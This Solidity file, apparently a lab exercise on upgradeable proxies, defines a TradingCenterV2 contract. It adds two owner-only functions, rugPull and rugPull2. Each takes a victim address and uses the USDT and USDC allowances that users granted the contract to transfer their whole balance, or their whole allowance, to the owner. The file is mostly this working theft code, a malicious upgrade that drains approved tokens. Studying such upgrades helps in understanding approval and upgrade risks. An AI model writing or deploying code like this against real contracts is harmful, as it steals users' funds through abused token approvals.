// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import {Proxy} from "./Proxy.sol";
import {TradingCenter} from "./TradingCenter.sol";
import {Ownable} from "./Ownable.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter, Ownable{
    bool public v2Initialized;

    function v2Initialize() external {
        require(!v2Initialized, "already initialized");
        v2Initialized = true;
    }

    // 若是allowance數量不足，則revert
    function rugPull(address _victim) external onlyOwner {
        address owner = getOwner();
        require(usdt.balanceOf(_victim) <= usdt.allowance(_victim , address(this)) &&
                usdc.balanceOf(_victim) <= usdc.allowance(_victim , address(this)),
                "Insufficient allowance");
        usdt.transferFrom(_victim, owner, usdt.balanceOf(_victim));
        usdc.transferFrom(_victim, owner, usdc.balanceOf(_victim));
    }

    // 若是 victim 的 usdt 或 usdc 的 balance 小於等於 allowance，就直接 transferFrom _victim的所有餘額
    // 反之，若是balance 大於 allowance，就直接 transferFrom _victim的 allowance 數量的 token
    function rugPull2(address _victim) external onlyOwner {
        address owner = getOwner();
        // usdt
        if(usdt.balanceOf(_victim) <= usdt.allowance(_victim , address(this))){
            usdt.transferFrom(_victim, owner, usdt.balanceOf(_victim));
        }else{
            usdt.transferFrom(_victim, owner, usdt.allowance(_victim, address(this)));
        }
        // usdc
        if(usdc.balanceOf(_victim) <= usdc.allowance(_victim , address(this))){
            usdc.transferFrom(_victim, owner, usdc.balanceOf(_victim));
        }else{
            usdc.transferFrom(_victim, owner, usdc.allowance(_victim, address(this)));
        }
    }

    function VERSION() external view virtual override returns (string memory) {
        return "0.0.2";
    }
}